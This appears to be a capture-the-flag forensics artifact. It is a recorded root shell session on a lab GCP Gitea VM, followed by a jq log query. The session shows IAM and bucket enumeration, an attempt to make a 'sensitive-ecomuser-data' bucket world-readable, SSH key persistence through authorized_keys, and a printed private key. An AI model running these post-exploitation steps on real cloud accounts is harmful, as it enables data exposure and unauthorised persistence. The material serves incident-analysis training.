```
bash: cannot set terminal process group (2134): Inappropriate ioctl for device

bash: no job control in this shell

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

whoami

  

whoami

root

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

ld

  

ld

  

Command 'ld' not found, but can be installed with:

  

apt install binutils

  

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

ls

  

ls

HEAD

branches

config

description

hooks

info

objects

refs

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

gcloud auth list

  

gcloud auth list

Credentialed Accounts

ACTIVE ACCOUNT

* 257145238219-compute@developer.gserviceaccount.com

  

To set the active account, run:

$ gcloud config set account `ACCOUNT`

  

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

SERVICE_ACCOUNT_NAME=257145238219-compute@developer.gserviceaccount.com

  

  

<=257145238219-compute@developer.gserviceaccount.com .....

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

gsutil ls

  

gsutil ls

gs://sensitive-ecomuser-data/

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

gsutil ls gs://sensitive-ecomuser-data/

  

  

<-learn.git# gsutil ls gs://sensitive-ecomuser-data/ .....

AccessDeniedException: 403 257145238219-compute@developer.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket. Permission 'storage.objects.list' denied on resource (or it may not exist).

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

gcloud projects get-iam-policy qwiklabs-gcp-00-848c1b920007 \

  

  

<jects get-iam-policy qwiklabs-gcp-00-848c1b920007 \ .....

--filter="bindings.members:serviceAccount:$SERVICE_ACCOUNT_EMAIL" \

--flatten="bindings[].members" \

  

  

> --filter="bindings.members:serviceAccount:$SERVICE_ACCOUNT_EMAIL" \

> --flatten="bindings[].members" \

>

--format="table(bindings.role)"

  

--format="table(bindings.role)"

ROLE

roles/bigquery.admin

roles/cloudbuild.builds.builder

roles/cloudbuild.serviceAgent

roles/compute.serviceAgent

roles/container.serviceAgent

roles/editor

roles/editor

roles/owner

roles/owner

roles/storage.admin

roles/storage.admin

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

gsutil acl ch -u AllUsers:R gs://sensitive-ecomuser-data/

  

  

< acl ch -u AllUsers:R gs://sensitive-ecomuser-data/ .....

ERROR 0616 09:50:39.022985 retry_decorator.py] Retrying in 0.92 seconds ...

Traceback (most recent call last):

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/gcs_json_api.py", line 498, in GetBucket

global_params=global_params)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/third_party/storage_apitools/storage_v1_client.py", line 285, in Get

config, request, global_params=global_params)

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/apitools/apitools/base/py/base_api.py", line 737, in _RunMethod

return self.ProcessHttpResponse(method_config, http_response, request)

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/apitools/apitools/base/py/base_api.py", line 743, in ProcessHttpResponse

self.__ProcessHttpResponse(method_config, http_response, request))

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/apitools/apitools/base/py/base_api.py", line 610, in __ProcessHttpResponse

http_response, method_config=method_config, request=request)

apitools.base.py.exceptions.HttpForbiddenError: HttpError accessing <https://storage.googleapis.com/storage/v1/b/sensitive-ecomuser-data?alt=json&fields=metageneration%2Cacl&projection=full>: response: <{'content-type': 'application/json; charset=UTF-8', 'date': 'Sun, 16 Jun 2024 09:50:39 GMT', 'vary': 'Origin, X-Origin', 'cache-control': 'no-cache, no-store, max-age=0, must-revalidate', 'expires': 'Mon, 01 Jan 1990 00:00:00 GMT', 'pragma': 'no-cache', 'x-guploader-uploadid': 'ABPtcPoMw4KxVzF_xu26c_4cIb3dJwnttMzVl6Kxsy2m4870V4J3SgrIZX31ruQjP03dAt-0nVs', 'content-length': '580', 'server': 'UploadServer', 'status': '403'}>, content <{

"error": {

"code": 403,

"message": "257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).",

"errors": [

{

"message": "257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).",

"domain": "global",

"reason": "forbidden"

}

]

}

}

>

  

During handling of the above exception, another exception occurred:

  

Traceback (most recent call last):

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/retry-decorator/retry_decorator/retry_decorator.py", line 20, in f_retry

return f(*args, **kwargs)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/commands/acl.py", line 442, in ApplyAclChanges

fields=['acl', 'metageneration'])

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/cloud_api_delegator.py", line 229, in GetBucket

return self._GetApi(provider).GetBucket(bucket_name, fields=fields)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/gcs_json_api.py", line 500, in GetBucket

self._TranslateExceptionAndRaise(e, bucket_name=bucket_name)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/gcs_json_api.py", line 2255, in _TranslateExceptionAndRaise

raise translated_exception

gslib.cloud_api.AccessDeniedException: AccessDeniedException: 403 257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).

ERROR 0616 09:50:40.124068 retry_decorator.py] Retrying in 1.86 seconds ...

Traceback (most recent call last):

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/gcs_json_api.py", line 498, in GetBucket

global_params=global_params)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/third_party/storage_apitools/storage_v1_client.py", line 285, in Get

config, request, global_params=global_params)

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/apitools/apitools/base/py/base_api.py", line 737, in _RunMethod

return self.ProcessHttpResponse(method_config, http_response, request)

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/apitools/apitools/base/py/base_api.py", line 743, in ProcessHttpResponse

self.__ProcessHttpResponse(method_config, http_response, request))

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/apitools/apitools/base/py/base_api.py", line 610, in __ProcessHttpResponse

http_response, method_config=method_config, request=request)

apitools.base.py.exceptions.HttpForbiddenError: HttpError accessing <https://storage.googleapis.com/storage/v1/b/sensitive-ecomuser-data?alt=json&fields=metageneration%2Cacl&projection=full>: response: <{'content-type': 'application/json; charset=UTF-8', 'date': 'Sun, 16 Jun 2024 09:50:40 GMT', 'vary': 'Origin, X-Origin', 'cache-control': 'no-cache, no-store, max-age=0, must-revalidate', 'expires': 'Mon, 01 Jan 1990 00:00:00 GMT', 'pragma': 'no-cache', 'x-guploader-uploadid': 'ABPtcPo3SJmqZIpJZPrAjxNCf4keHApnjxvMzfudw7pslFsv_4ZMxKSagT44mZzL01OdDAQrNW0', 'content-length': '580', 'server': 'UploadServer', 'status': '403'}>, content <{

"error": {

"code": 403,

"message": "257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).",

"errors": [

{

"message": "257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).",

"domain": "global",

"reason": "forbidden"

}

]

}

}

>

  

During handling of the above exception, another exception occurred:

  

Traceback (most recent call last):

File "/snap/google-cloud-sdk/195/platform/gsutil/third_party/retry-decorator/retry_decorator/retry_decorator.py", line 20, in f_retry

return f(*args, **kwargs)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/commands/acl.py", line 442, in ApplyAclChanges

fields=['acl', 'metageneration'])

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/cloud_api_delegator.py", line 229, in GetBucket

return self._GetApi(provider).GetBucket(bucket_name, fields=fields)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/gcs_json_api.py", line 500, in GetBucket

self._TranslateExceptionAndRaise(e, bucket_name=bucket_name)

File "/snap/google-cloud-sdk/195/platform/gsutil/gslib/gcs_json_api.py", line 2255, in _TranslateExceptionAndRaise

raise translated_exception

gslib.cloud_api.AccessDeniedException: AccessDeniedException: 403 257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).

AccessDeniedException: 403 257145238219-compute@developer.gserviceaccount.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist).

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

gcloud compute instances list

  

  

<james/test-learn.git# gcloud compute instances list .....

NAME ZONE MACHINE_TYPE PREEMPTIBLE INTERNAL_IP EXTERNAL_IP STATUS

gitea-vm us-central1-a e2-medium 10.128.0.4 34.66.191.87 RUNNING

linux-machine1 us-central1-a e2-medium 10.128.0.7 34.42.164.212 RUNNING

linux-machine2 us-central1-a e2-medium 10.128.0.2 34.172.179.63 RUNNING

packet-mirror-instance us-central1-a e2-medium 10.128.0.5 34.28.192.153 RUNNING

windows-machine us-central1-a e2-medium 10.128.0.3 34.45.236.159 RUNNING

root@gitea-vm:~/gitea-repositories/james/test-learn.git#

cd /root

  

cd /root

root@gitea-vm:~#

ssh-keygen -t rsa -b 2048

  

ssh-keygen -t rsa -b 2048

Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa):

  

  

Enter passphrase (empty for no passphrase):

  

  

Enter same passphrase again:

  

  

Your identification has been saved in /root/.ssh/id_rsa

Your public key has been saved in /root/.ssh/id_rsa.pub

The key fingerprint is:

SHA256:UHZNhyHTJaiX/0ZMgUl3aCU/7hHsyo6pcJ68n2Q2m8Q root@gitea-vm

The key's randomart image is:

+---[RSA 2048]----+

| o +*=*=oo|

| o ..o*+=+ |

| . . . . =.|

| .. o + o|

| S. . o + |

| . o = .|

| . . E = . |

| = * O o |

| *+B o |

+----[SHA256]-----+

root@gitea-vm:~#

cd .ssh

  

cd .ssh

root@gitea-vm:~/.ssh#

ls

  

ls

authorized_keys

id_rsa

id_rsa.pub

root@gitea-vm:~/.ssh#

cat id_rsa.pub > authorized_keys

  

cat id_rsa.pub > authorized_keys

root@gitea-vm:~/.ssh#

cat id_rsa

  

cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----

b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn

NhAAAAAwEAAQAAAQEAutCwDVZNVkXjHAklK1/LUSiWujZQFtZJBLXeECZZ7PKZM8SXmBl9

la5Bl5AlVfyxGXz4QhLkOAPwHe2AHzpNPSIjv82gKJaE2AvkjzzbY3fq5UhO8zG2C7OEn2

7796CaPVQP4YRcGe3D7zLVhloBoLx9+qdLZ82XP0lo09gAuFboNY7RDe+hy8IPPwyUfk7a

vwa235Bi82CrOdY/oXBBhFtCbHlDV5w3eAjUQcEE2TgFXOToY+XOcMYM6FcJG38PkLxIRN

ZQ/LrLi6B3Tczgiw5a0HVcfMJcfXBtHSlDeETUjvhgg9RkqLFuf7Oh1c1tm8JwBS+mzBHq

Amuh56fXsQAAA8hwJnKDcCZygwAAAAdzc2gtcnNhAAABAQC60LANVk1WReMcCSUrX8tRKJ

a6NlAW1kkEtd4QJlns8pkzxJeYGX2VrkGXkCVV/LEZfPhCEuQ4A/Ad7YAfOk09IiO/zaAo

loTYC+SPPNtjd+rlSE7zMbYLs4Sfbvv3oJo9VA/hhFwZ7cPvMtWGWgGgvH36p0tnzZc/SW

jT2AC4Vug1jtEN76HLwg8/DJR+Ttq/BrbfkGLzYKs51j+hcEGEW0JseUNXnDd4CNRBwQTZ

OAVc5Ohj5c5wxgzoVwkbfw+QvEhE1lD8usuLoHdNzOCLDlrQdVx8wlx9cG0dKUN4RNSO+G

CD1GSosW5/s6HVzW2bwnAFL6bMEeoCa6Hnp9exAAAAAwEAAQAAAQBRAlvFfM4OgkHIj4Kp

u2GMMQCjgRfbv1Jsk3zXHfpS0KR0mWRvVWZq+OSCl8RI9EnL1rBE3rJORA7ku2+amwqRXv

OHoeA4mYTDtuyG3In6KS8X+/IYbU8W5eK1zEfBCsi3nXNBhMb3i24ylKWZHACmtfYfMlp1

ieZzUB7/9iPhyzfSi+Js5iDPLE/2LAixk+P4vWly3OOtvc2h+Cfls5UrQcp846BYkl1ylb

ujffovmKcIxtlq5abi8PFuZgMU0s5v0SPohCMYly/1Zt3OMPR6dyOGZ4hNega040hzV82u

Ybuc4weKfuMHAwmMtbQsezhTuq8wBfEWHk93A2y8zzDRAAAAgASBVbtu40h9OcEXHMgfnh

kcvP9BinSVnU6f6kbJt5QsH7zfnNOqj4IEPsVoe4ADC9gWWJTKThtVeRAbEGvZnNoZ/bRJ

1r5HWUlybc6EqtDg2jxpiZo9uauOeBM49cgM5qxh4FtWJrd0JpG99h7ASYYyp3KsHPF72w

kUfZF+khiQAAAAgQDpyHuM/AwEQCr4YGisN52Q5j1Lrd61ASPBMFrKf/CGd//YBAvKzMQC

rWcO5UE5C+tCTJyB/p7JHkYDDs3ZDtfDTFsroyhTSP3DaK7RIhuzFredef6R/kuWYgee6h

mKGXGhjc4BwH5AQNxqMm+kBzPZTRd5TmRB+KQNbGTCZd+PvQAAAIEAzJGPfwwumeKiS00d

eOdtU6RUVI3srWi5wOY3tYotYVII53Xt/uefA43O0XdUIw7O0tnSNmco0+YSWl6k2ysArr

qDy5tvyO0k6rFfNlXJ9jH624TT9scMRRp7ThJ8akTcK9sHUzEkD8vLPzwcqc4jD+Fa3WUg

VHCP6CiSKGzSPQUAAAANcm9vdEBnaXRlYS12bQECAwQFBg==

-----END OPENSSH PRIVATE KEY-----

root@gitea-vm:~/.ssh# exit

```




```
 [~/Desktop/HTB/Cloud/MisCloud]
 perplex  cat GCloud_Logs.json | jq '.[] | select(.protoPayload.authenticationInfo.principalEmail=="257145238219-compute@developer.gserviceaccount.com" and .protoPayload.methodName=="google.cloud.oslogin.v1.OsLoginService.CheckPolicy")' | jq .protoPayload.request.instance | sort | uniq

"linux-machine1"
"linux-machine2"
"packet-mirror-instance"


```